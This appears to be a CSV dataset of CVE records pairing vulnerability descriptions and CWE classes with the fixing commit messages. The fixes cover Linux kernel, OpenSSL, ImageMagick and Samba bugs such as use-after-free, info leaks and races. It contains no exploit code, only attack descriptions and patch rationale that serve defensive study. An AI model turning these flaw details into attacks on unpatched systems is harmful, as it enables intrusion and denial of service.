CVE-2012-3552,CWE-362,2012-10-03,Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.,"We lack proper synchronization to manipulate inet->opt ip_options  Problem is ip_make_skb() calls ip_setup_cork() and ip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options), without any protection against another thread manipulating inet->opt.  Another thread can change inet->opt pointer and free old one under us.  Use RCU to protect inet->opt (changed to inet->inet_opt).  Instead of handling atomic refcounts, just copy ip_options when necessary, to avoid cache line dirtying.  We cant insert an rcu_head in struct ip_options since its included in skb->cb[], so this patch is large because I had to introduce a new ip_options_rcu structure.  Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-8961,CWE-416,2016-11-16,The __ext4_journal_stop function in fs/ext4/ext4_jbd2.c in the Linux kernel before 4.3.3 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging improper access to a certain error field.,There is a use-after-free possibility in __ext4_journal_stop() in the case that we free the handle in the first jbd2_journal_stop() because we're referencing handle->h_err afterwards. This was introduced in 9705acd and it is wrong. Fix it by storing the handle->h_err value beforehand and avoid referencing potentially freed handle.  Fixes: 9705acd Signed-off-by: Lukas Czerner <lczerner@redhat.com> Reviewed-by: Andreas Dilger <adilger@dilger.ca> Cc: stable@vger.kernel.org
CVE-2016-8693,CWE-415,2017-02-15,Double free vulnerability in the mem_close function in jas_stream.c in JasPer before 1.900.10 allows remote attackers to cause a denial of service (crash) or possibly execute arbitrary code via a crafted BMP image to the imginfo command.,"The case of a zero-sized buffer was not handled correctly, as it could lead to a double free. This problem has now been fixed (hopefully). One might ask whether a zero-sized buffer should be allowed at all, but this is a question for another day."
CVE-2019-16994,CWE-401,2019-09-30,"In the Linux kernel before 5.0, a memory leak exists in sit_init_net() in net/ipv6/sit.c when register_netdev() fails to register sitn->fb_tunnel_dev, which may cause denial of service, aka CID-07f12b26e21a.","If register_netdev() is failed to register sitn->fb_tunnel_dev, it will go to err_reg_dev and forget to free netdev(sitn->fb_tunnel_dev).  BUG: memory leak unreferenced object 0xffff888378daad00 (size 512):   comm ""syz-executor.1"", pid 4006, jiffies 4295121142 (age 16.115s)   hex dump (first 32 bytes):     00 e6 ed c0 83 88 ff ff 00 00 00 00 00 00 00 00  ................     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ backtrace:     [<00000000d6dcb63e>] kvmalloc include/linux/mm.h:577 [inline]     [<00000000d6dcb63e>] kvzalloc include/linux/mm.h:585 [inline]     [<00000000d6dcb63e>] netif_alloc_netdev_queues net/core/dev.c:8380 [inline]     [<00000000d6dcb63e>] alloc_netdev_mqs+0x600/0xcc0 net/core/dev.c:8970     [<00000000867e172f>] sit_init_net+0x295/0xa40 net/ipv6/sit.c:1848     [<00000000871019fa>] ops_init+0xad/0x3e0 net/core/net_namespace.c:129     [<00000000319507f6>] setup_net+0x2ba/0x690 net/core/net_namespace.c:314     [<0000000087db4f96>] copy_net_ns+0x1dc/0x330 net/core/net_namespace.c:437     [<0000000057efc651>] create_new_namespaces+0x382/0x730 kernel/nsproxy.c:107     [<00000000676f83de>] copy_namespaces+0x2ed/0x3d0 kernel/nsproxy.c:165     [<0000000030b74bac>] copy_process.part.27+0x231e/0x6db0 kernel/fork.c:1919     [<00000000fff78746>] copy_process kernel/fork.c:1713 [inline]     [<00000000fff78746>] _do_fork+0x1bc/0xe90 kernel/fork.c:2224     [<000000001c2e0d1c>] do_syscall_64+0xc8/0x580 arch/x86/entry/common.c:290     [<00000000ec48bd44>] entry_SYSCALL_64_after_hwframe+0x49/0xbe     [<0000000039acff8a>] 0xffffffffffffffff  Signed-off-by: Mao Wenan <maowenan@huawei.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-1559,CWE-203,2019-02-27,"If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable ""non-stitched"" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
CVE-2015-5330,CWE-200,2015-12-29,"ldb before 1.1.24, as used in the AD LDAP server in Samba 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3, mishandles string lengths, which allows remote attackers to obtain sensitive information from daemon heap memory by sending crafted packets and then reading (1) an error message or (2) a database value.",
CVE-2016-2105,CWE-190,2016-05-05,Integer overflow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of binary data.,
CVE-2014-3610,,2014-11-10,"The WRMSR processing functionality in the KVM subsystem in the Linux kernel through 3.17.2 does not properly handle the writing of a non-canonical address to a model-specific register, which allows guest OS users to cause a denial of service (host OS crash) by leveraging guest OS privileges, related to the wrmsr_interception function in arch/x86/kvm/svm.c and the handle_wrmsr function in arch/x86/kvm/vmx.c.","Upon WRMSR, the CPU should inject #GP if a non-canonical value (address) is written to certain MSRs. The behavior is ""almost"" identical for AMD and Intel (ignoring MSRs that are not implemented in either architecture since they would anyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if non-canonical address is written on Intel but not on AMD (which ignores the top 32-bits).  Accordingly, this patch injects a #GP on the MSRs which behave identically on Intel and AMD.  To eliminate the differences between the architecutres, the value which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to canonical value before writing instead of injecting a #GP.  Some references from Intel and AMD manuals:  According to Intel SDM description of WRMSR instruction #GP is expected on WRMSR ""If the source register contains a non-canonical address and ECX specifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE, IA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP.""  According to AMD manual instruction manual: LSTAR/CSTAR (SYSCALL): ""The WRMSR instruction loads the target RIP into the LSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical form, a general-protection exception (#GP) occurs."" IA32_GS_BASE and IA32_FS_BASE (WRFSBASE/WRGSBASE): ""The address written to the base field must be in canonical form or a #GP fault will occur."" IA32_KERNEL_GS_BASE (SWAPGS): ""The address stored in the KernelGSbase MSR must be in canonical form.""  This patch fixes CVE-2014-3610.  Cc: stable@vger.kernel.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-2548,CWE-310,2013-03-15,"The crypto_report_one function in crypto/crypto_user.c in the report API in the crypto user configuration API in the Linux kernel through 3.8.2 uses an incorrect length value during a copy operation, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.","Three errors resulting in kernel memory disclosure:  1/ The structures used for the netlink based crypto algorithm report API are located on the stack. As snprintf() does not fill the remainder of the buffer with null bytes, those stack bytes will be disclosed to users of the API. Switch to strncpy() to fix this.  2/ crypto_report_one() does not initialize all field of struct crypto_user_alg. Fix this to fix the heap info leak.  3/ For the module name we should copy only as many bytes as module_name() returns -- not as much as the destination buffer could hold. But the current code does not and therefore copies random data from behind the end of the module name, as the module name is always shorter than CRYPTO_MAX_ALG_NAME.  Also switch to use strncpy() to copy the algorithm's name and driver_name. They are strings, after all.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2015-8959,CWE-399,2017-04-20,coders/dds.c in ImageMagick before 6.9.0-4 Beta allows remote attackers to cause a denial of service (CPU consumption) via a crafted DDS file.,
CVE-2017-16994,CWE-200,2017-11-27,"The walk_hugetlb_range function in mm/pagewalk.c in the Linux kernel before 4.14.2 mishandles holes in hugetlb ranges, which allows local users to obtain sensitive information from uninitialized kernel memory via crafted use of the mincore() system call.","This matters at least for the mincore syscall, which will otherwise copy uninitialized memory from the page allocator to userspace.  It is probably also a correctness error for /proc/$pid/pagemap, but I haven't tested that.  Removing the `walk->hugetlb_entry` condition in walk_hugetlb_range() has no effect because the caller already checks for that.  This only reports holes in hugetlb ranges to callers who have specified a hugetlb_entry callback.  This issue was found using an AFL-based fuzzer.  v2:  - don't crash on ->pte_hole==NULL (Andrew Morton)  - add Cc stable (Andrew Morton)  Fixes: 1e25a27 (""mincore: apply page table walker on do_mincore()"") Signed-off-by: Jann Horn <jannh@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-16511,CWE-704,2018-09-05,"An issue was discovered in Artifex Ghostscript before 9.24. A type confusion in ""ztype"" could be used by remote attackers able to supply crafted PostScript to crash the interpreter or possibly have unspecified other impact.",
CVE-2016-6912,CWE-415,2017-01-26,Double free vulnerability in the gdImageWebPtr function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to have unspecified impact via large width and height values.,"The issue is that gdImageWebpCtx() (which is called by gdImageWebpPtr() and the other WebP output functions to do the real work) does not return whether it succeeded or failed, so this is not checked in gdImageWebpPtr() and the function wrongly assumes everything is okay, which is not, in this case, because there is a size limitation for WebP, namely that the width and height must by less than 16383.  We can't change the signature of gdImageWebpCtx() for API compatibility reasons, so we introduce the static helper _gdImageWebpCtx() which returns success respective failure, so gdImageWebpPtr() and gdImageWebpPtrEx() can check the return value. We leave it solely to libwebp for now to report warnings regarding the failing write.  This issue had been reported by Ibrahim El-Sayed to security@libgd.org.  CVE-2016-6912"
CVE-2012-6539,CWE-200,2013-03-15,"The dev_ifconf function in net/socket.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","The implementation of dev_ifconf() for the compat ioctl interface uses an intermediate ifc structure allocated in userland for the duration of the syscall. Though, it fails to initialize the padding bytes inserted for alignment and that for leaks four bytes of kernel stack. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-11413,CWE-674,2019-04-22,An issue was discovered in Artifex MuJS 1.0.5. It has unlimited recursion because the match function in regexp.c lacks a depth check.,Also handle negative return code as an error in the JS bindings.
CVE-2016-7797,CWE-254,2017-03-24,"Pacemaker before 1.1.15, when using pacemaker remote, might allow remote attackers to cause a denial of service (node disconnection) via an unauthenticated connection.",
CVE-2016-2108,CWE-119,2016-05-05,"The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers to execute arbitrary code or cause a denial of service (buffer underflow and memory corruption) via an ANY field in crafted serialized data, aka the ""negative zero"" issue.",
CVE-2016-2070,CWE-189,2016-05-02,The tcp_cwnd_reduction function in net/ipv4/tcp_input.c in the Linux kernel before 4.3.5 allows remote attackers to cause a denial of service (divide-by-zero error and system crash) via crafted TCP traffic.,"Patch 3759824 (""tcp: PRR uses CRB mode by default and SS mode conditionally"") introduced a bug that cwnd may become 0 when both inflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead to a div-by-zero if the connection starts another cwnd reduction phase by setting tp->prior_cwnd to the current cwnd (0) in tcp_init_cwnd_reduction().  To prevent this we skip PRR operation when nothing is acked or sacked. Then cwnd must be positive in all cases as long as ssthresh is positive:  1) The proportional reduction mode    inflight > ssthresh > 0  2) The reduction bound mode   a) inflight == ssthresh > 0    b) inflight < ssthresh      sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh  Therefore in all cases inflight and sndcnt can not both be 0. We check invalid tp->prior_cwnd to avoid potential div0 bugs.  In reality this bug is triggered only with a sequence of less common events.  For example, the connection is terminating an ECN-triggered cwnd reduction with an inflight 0, then it receives reordered/old ACKs or DSACKs from prior transmission (which acks nothing). Or the connection is in fast recovery stage that marks everything lost, but fails to retransmit due to local issues, then receives data packets from other end which acks nothing.  Fixes: 3759824 (""tcp: PRR uses CRB mode by default and SS mode conditionally"") Reported-by: Oleksandr Natalenko <oleksandr@natalenko.name> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11328,CWE-119,2017-07-17,Heap buffer overflow in the yr_object_array_set_item() function in object.c in YARA 3.x allows a denial-of-service attack by scanning a crafted .NET file.,"When setting a new array item with yr_object_array_set_item() the array size is doubled if the index for the new item is larger than the already allocated ones. No further checks were made to ensure that the index fits into the array after doubling its capacity. If the array capacity was for example 64, and a new object is assigned to an index larger than 128 the overflow occurs. As yr_object_array_set_item() is usually invoked with indexes that increase monotonically by one, this bug never triggered before. But the new ""dotnet"" module has the potential to allow the exploitation of this bug by scanning a specially crafted .NET binary."
CVE-2012-6544,CWE-200,2013-03-15,"The Bluetooth protocol stack in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application that targets the (1) L2CAP or (2) HCI implementation.",The HCI code fails to initialize the hci_channel member of struct sockaddr_hci and that for leaks two bytes kernel stack via the getsockname() syscall. Initialize hci_channel with 0 to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2014-2523,CWE-20,2014-03-24,"net/netfilter/nf_conntrack_proto_dccp.c in the Linux kernel through 3.13.6 uses a DCCP header pointer incorrectly, which allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a DCCP packet that triggers a call to the (1) dccp_new, (2) dccp_packet, or (3) dccp_error function.","Some occurences in the netfilter tree use skb_header_pointer() in the following way ...    struct dccp_hdr _dh, *dh;   ...   skb_header_pointer(skb, dataoff, sizeof(_dh), &dh);  ... where dh itself is a pointer that is being passed as the copy buffer. Instead, we need to use &_dh as the forth argument so that we're copying the data into an actual buffer that sits on the stack.  Currently, we probably could overwrite memory on the stack (e.g. with a possibly mal-formed DCCP packet), but unintentionally, as we only want the buffer to be placed into _dh variable.  Fixes: 2bc7804 (""[NETFILTER]: nf_conntrack: add DCCP protocol support"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2019-14934,CWE-787,2019-08-11,"An issue was discovered in PDFResurrect before 0.18. pdf_load_pages_kids in pdf.c doesn't validate a certain size value, which leads to a malloc failure and out-of-bounds write.",This addresses the memory issues in Issue #6 expressed in calloc_some.pdf and malloc_some.pdf
CVE-2016-9387,CWE-190,2017-03-23,"Integer overflow in the jpc_dec_process_siz function in libjasper/jpc/jpc_dec.c in JasPer before 1.900.13 allows remote attackers to have unspecified impact via a crafted file, which triggers an assertion failure.",
CVE-2019-10639,CWE-326,2019-07-05,"The Linux kernel 4.x (starting from 4.1) and 5.x before 5.0.8 allows Information Exposure (partial kernel address disclosure), leading to a KASLR bypass. Specifically, it is possible to extract the KASLR kernel image offset using the IP ID values the kernel produces for connection-less protocols (e.g., UDP and ICMP). When such traffic is sent to multiple destination IP addresses, it is possible to obtain hash collisions (of indices to the counter array) and thereby obtain the hashing key (via enumeration). This key contains enough bits from a kernel address (of a static variable) so when the key is extracted (via enumeration), the offset of the kernel image is exposed. This attack can be carried out remotely, by the attacker forcing the target device to send UDP or ICMP (or certain other) traffic to attacker-controlled IP addresses. Forcing a server to send UDP traffic is trivial if the server is a DNS server. ICMP traffic is trivial if the server answers ICMP Echo requests (ping). For client targets, if the target visits the attacker's web page, then WebRTC or gQUIC can be used to force UDP traffic to attacker-controlled IP addresses. NOTE: this attack against KASLR became viable in 4.1 because IP ID generation was changed to have a dependency on an address associated with a network namespace.","net_hash_mix() currently uses kernel address of a struct net, and is used in many places that could be used to reveal this address to a patient attacker, thus defeating KASLR, for the typical case (initial net namespace, &init_net is not dynamically allocated)  I believe the original implementation tried to avoid spending too many cycles in this function, but security comes first.  Also provide entropy regardless of CONFIG_NET_NS.  Fixes: 0b44191 (""netns: introduce the net_hash_mix ""salt"" for hashes"") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Amit Klein <aksecurity@gmail.com> Reported-by: Benny Pinkas <benny@pinkas.net> Cc: Pavel Emelyanov <xemul@openvz.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-4440,CWE-264,2016-06-27,"arch/x86/kvm/vmx.c in the Linux kernel through 4.6.3 mishandles the APICv on/off state, which allows guest OS users to obtain direct APIC MSR access on the host OS, and consequently cause a denial of service (host OS crash) or possibly execute arbitrary code on the host OS, via x2APIC mode.","The function to update APICv on/off state (in particular, to deactivate it when enabling Hyper-V SynIC) is incomplete: it doesn't adjust APICv-related fields among secondary processor-based VM-execution controls.  As a result, Windows 2012 guests get stuck when SynIC-based auto-EOI interrupt intersected with e.g. an IPI in the guest.  In addition, the MSR intercept bitmap isn't updated every time ""virtualize x2APIC mode"" is toggled.  This path can only be triggered by a malicious guest, because Windows didn't use x2APIC but rather their own synthetic APIC access MSRs; however a guest running in a SynIC-enabled VM could switch to x2APIC and thus obtain direct access to host APIC MSRs (CVE-2016-4440).  The patch fixes those omissions.  Signed-off-by: Roman Kagan <rkagan@virtuozzo.com> Reported-by: Steve Rutherford <srutherford@google.com> Reported-by: Yang Zhang <yang.zhang.wz@gmail.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2011-1428,CWE-20,2011-03-16,"Wee Enhanced Environment for Chat (aka WeeChat) 0.3.4 and earlier does not properly verify that the server hostname matches the domain name of the subject of an X.509 certificate, which allows man-in-the-middle attackers to spoof an SSL chat server via an arbitrary certificate, related to incorrect use of the GnuTLS API.",
CVE-2018-14357,CWE-78,2018-07-17,"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They allow remote IMAP servers to execute arbitrary commands via backquote characters, related to the mailboxes command associated with an automatic subscription.",Co-authored-by: JerikoOne <jeriko.one@gmx.us>
CVE-2014-3534,CWE-269,2014-08-01,"arch/s390/kernel/ptrace.c in the Linux kernel before 3.15.8 on the s390 platform does not properly restrict address-space control operations in PTRACE_POKEUSR_AREA requests, which allows local users to obtain read and write access to kernel memory locations, and consequently gain privileges, via a crafted application that makes a ptrace system call.","The PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect. The PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace interface accepts all combinations for the address-space-control bits. To protect the kernel space the PSW mask check in ptrace needs to reject the address-space-control bit combination for home space.  Fixes CVE-2014-3534  Cc: stable@vger.kernel.org Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>"
CVE-2016-8610,CWE-400,2017-11-13,"A denial of service flaw was found in OpenSSL 0.9.8, 1.0.1, 1.0.2 through 1.0.2h, and 1.1.0 in the way the TLS/SSL protocol defined processing of ALERT packets during a connection handshake. A remote attacker could use this flaw to make a TLS/SSL server consume an excessive amount of CPU and fail to accept connections from other clients.",
CVE-2016-3140,,2016-05-02,The digi_port_init function in drivers/usb/serial/digi_acceleport.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,The driver can be crashed with devices that expose crafted descriptors with too few endpoints.  See: http://seclists.org/bugtraq/2016/Mar/61  Signed-off-by: Oliver Neukum <ONeukum@suse.com> [johan: fix OOB endpoint check and add error messages ] Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2018-1000037,CWE-20,2018-05-24,"In Artifex MuPDF 1.12.0 and earlier, multiple reachable assertions in the PDF parser allow an attacker to cause a denial of service (assert crash) via a crafted file.",
CVE-2017-18208,CWE-835,2018-03-01,The madvise_willneed function in mm/madvise.c in the Linux kernel before 4.14.4 allows local users to cause a denial of service (infinite loop) by triggering use of MADVISE_WILLNEED for a DAX mapping.,"MADVISE_WILLNEED has always been a noop for DAX (formerly XIP) mappings. Unfortunately madvise_willneed() doesn't communicate this information properly to the generic madvise syscall implementation.  The calling convention is quite subtle there.  madvise_vma() is supposed to either return an error or update &prev otherwise the main loop will never advance to the next vma and it will keep looping for ever without a way to get out of the kernel.  It seems this has been broken since introduction.  Nobody has noticed because nobody seems to be using MADVISE_WILLNEED on these DAX mappings.  [mhocko@suse.com: rewrite changelog] Link: http://lkml.kernel.org/r/20171127115318.911-1-guoxuenan@huawei.com Fixes: fe77ba6 (""[PATCH] xip: madvice/fadvice: execute in place"") Signed-off-by: chenjie <chenjie6@huawei.com> Signed-off-by: guoxuenan <guoxuenan@huawei.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: Minchan Kim <minchan@kernel.org> Cc: zhangyi (F) <yi.zhang@huawei.com> Cc: Miao Xie <miaoxie@huawei.com> Cc: Mike Rapoport <rppt@linux.vnet.ibm.com> Cc: Shaohua Li <shli@fb.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Cc: Mel Gorman <mgorman@techsingularity.net> Cc: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Cc: David Rientjes <rientjes@google.com> Cc: Anshuman Khandual <khandual@linux.vnet.ibm.com> Cc: Rik van Riel <riel@redhat.com> Cc: Carsten Otte <cotte@de.ibm.com> Cc: Dan Williams <dan.j.williams@intel.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-9840,,2017-05-23,inftrees.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.,"inftrees.c was subtracting an offset from a pointer to an array, in order to provide a pointer that allowed indexing starting at the offset. This is not compliant with the C standard, for which the behavior of a pointer decremented before its allocated memory is undefined. Per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this tiny optimization was removed, in order to avoid the possibility of undefined behavior."
CVE-2017-18203,CWE-362,2018-02-27,The dm_get_from_kobject function in drivers/md/dm.c in the Linux kernel before 4.14.3 allow local users to cause a denial of service (BUG) by leveraging a race condition with __dm_destroy during creation and removal of DM devices.,"The following BUG_ON was hit when testing repeat creation and removal of DM devices:      kernel BUG at drivers/md/dm.c:2919!     CPU: 7 PID: 750 Comm: systemd-udevd Not tainted 4.1.44     Call Trace:      [<ffffffff81649e8b>] dm_get_from_kobject+0x34/0x3a      [<ffffffff81650ef1>] dm_attr_show+0x2b/0x5e      [<ffffffff817b46d1>] ? mutex_lock+0x26/0x44      [<ffffffff811df7f5>] sysfs_kf_seq_show+0x83/0xcf      [<ffffffff811de257>] kernfs_seq_show+0x23/0x25      [<ffffffff81199118>] seq_read+0x16f/0x325      [<ffffffff811de994>] kernfs_fop_read+0x3a/0x13f      [<ffffffff8117b625>] __vfs_read+0x26/0x9d      [<ffffffff8130eb59>] ? security_file_permission+0x3c/0x44      [<ffffffff8117bdb8>] ? rw_verify_area+0x83/0xd9      [<ffffffff8117be9d>] vfs_read+0x8f/0xcf      [<ffffffff81193e34>] ? __fdget_pos+0x12/0x41      [<ffffffff8117c686>] SyS_read+0x4b/0x76      [<ffffffff817b606e>] system_call_fastpath+0x12/0x71  The bug can be easily triggered, if an extra delay (e.g. 10ms) is added between the test of DMF_FREEING & DMF_DELETING and dm_get() in dm_get_from_kobject().  To fix it, we need to ensure the test of DMF_FREEING & DMF_DELETING and dm_get() are done in an atomic way, so _minor_lock is used.  The other callers of dm_get() have also been checked to be OK: some callers invoke dm_get() under _minor_lock, some callers invoke it under _hash_lock, and dm_start_request() invoke it after increasing md->open_count.  Cc: stable@vger.kernel.org Signed-off-by: Hou Tao <houtao1@huawei.com> Signed-off-by: Mike Snitzer <snitzer@redhat.com>"
CVE-2015-0204,CWE-310,2015-01-09,"The ssl3_get_key_exchange function in s3_clnt.c in OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote SSL servers to conduct RSA-to-EXPORT_RSA downgrade attacks and facilitate brute-force decryption by offering a weak ephemeral RSA key in a noncompliant role, related to the ""FREAK"" issue.  NOTE: the scope of this CVE is only client code based on OpenSSL, not EXPORT_RSA issues associated with servers or other TLS implementations.",OpenSSL clients would tolerate temporary RSA keys in non-export ciphersuites. It also had an option SSL_OP_EPHEMERAL_RSA which enabled this server side. Remove both options as they are a protocol violation.  Thanks to Karthikeyan Bhargavan for reporting this issue. (CVE-2015-0204) Reviewed-by: Matt Caswell <matt@openssl.org>
CVE-2014-3568,CWE-310,2014-10-19,"OpenSSL before 0.9.8zc, 1.0.0 before 1.0.0o, and 1.0.1 before 1.0.1j does not properly enforce the no-ssl3 build option, which allows remote attackers to bypass intended access restrictions via an SSL 3.0 handshake, related to s23_clnt.c and s23_srvr.c.",
CVE-2018-11381,CWE-125,2018-05-22,The string_scan_range() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.,
CVE-2016-2107,CWE-200,2016-05-05,"The AES-NI implementation in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h does not consider memory allocation during a certain padding check, which allows remote attackers to obtain sensitive cleartext information via a padding-oracle attack against an AES CBC session. NOTE: this vulnerability exists because of an incorrect fix for CVE-2013-0169.",
CVE-2017-15129,CWE-362,2018-01-09,"A use-after-free vulnerability was found in network namespaces code affecting the Linux kernel before 4.14.11. The function get_net_ns_by_id() in net/core/net_namespace.c does not check for the net::count value after it has found a peer network in netns_ids idr, which could lead to double free and memory corruption. This vulnerability could allow an unprivileged local user to induce kernel memory corruption on the system, leading to a crash. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although it is thought to be unlikely.","(I can trivially verify that that idr_remove in cleanup_net happens  after the network namespace count has dropped to zero --EWB)  Function get_net_ns_by_id() does not check for net::count after it has found a peer in netns_ids idr.  It may dereference a peer, after its count has already been finaly decremented. This leads to double free and memory corruption:  put_net(peer)                                   rtnl_lock() atomic_dec_and_test(&peer->count) [count=0]     ... __put_net(peer)                                 get_net_ns_by_id(net, id)   spin_lock(&cleanup_list_lock)   list_add(&net->cleanup_list, &cleanup_list)   spin_unlock(&cleanup_list_lock) queue_work()                                      peer = idr_find(&net->netns_ids, id)   |                                               get_net(peer) [count=1]   |                                               ...   |                                               (use after final put)   v                                               ...   cleanup_net()                                   ...     spin_lock(&cleanup_list_lock)                 ...     list_replace_init(&cleanup_list, ..)          ...     spin_unlock(&cleanup_list_lock)               ...     ...                                           ...     ...                                           put_net(peer)     ...                                             atomic_dec_and_test(&peer->count) [count=0]     ...                                               spin_lock(&cleanup_list_lock)     ...                                               list_add(&net->cleanup_list, &cleanup_list)     ...                                               spin_unlock(&cleanup_list_lock)     ...                                             queue_work()     ...                                           rtnl_unlock()     rtnl_lock()                                   ...     for_each_net(tmp) {                           ...       id = __peernet2id(tmp, peer)                ...       spin_lock_irq(&tmp->nsid_lock)              ...       idr_remove(&tmp->netns_ids, id)             ...       ...                                         ...       net_drop_ns()                               ... 	net_free(peer)                            ...     }                                             ...   |   v   cleanup_net()     ...     (Second free of peer)  Also, put_net() on the right cpu may reorder with left's cpu list_replace_init(&cleanup_list, ..), and then cleanup_list will be corrupted.  Since cleanup_net() is executed in worker thread, while put_net(peer) can happen everywhere, there should be enough time for concurrent get_net_ns_by_id() to pick the peer up, and the race does not seem to be unlikely. The patch fixes the problem in standard way.  (Also, there is possible problem in peernet2id_alloc(), which requires check for net::count under nsid_lock and maybe_get_net(peer), but in current stable kernel it's used under rtnl_lock() and it has to be safe. Openswitch begun to use peernet2id_alloc(), and possibly it should be fixed too. While this is not in stable kernel yet, so I'll send a separate message to netdev@ later).  Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Kirill Tkhai <ktkhai@virtuozzo.com> Fixes: 0c7aecd ""netns: add rtnl cmd to add and get peer netns ids"" Reviewed-by: Andrey Ryabinin <aryabinin@virtuozzo.com> Reviewed-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Eric W. Biederman <ebiederm@xmission.com> Reviewed-by: Eric Dumazet <edumazet@google.com> Acked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2010-1642,CWE-119,2010-06-17,"The reply_sesssetup_and_X_spnego function in sesssetup.c in smbd in Samba before 3.4.8 and 3.5.x before 3.5.2 allows remote attackers to trigger an out-of-bounds read, and cause a denial of service (process crash), via a \xff\xff security blob length in a Session Setup AndX request.",
CVE-2016-10066,CWE-120,2017-03-03,Buffer overflow in the ReadVIFFImage function in coders/viff.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via a crafted file.,
CVE-2016-3137,,2016-05-02,"drivers/usb/serial/cypress_m8.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a USB device without both an interrupt-in and an interrupt-out endpoint descriptor, related to the cypress_generic_port_probe and cypress_open functions.",An attack using missing endpoints exists.  CVE-2016-3137  Signed-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
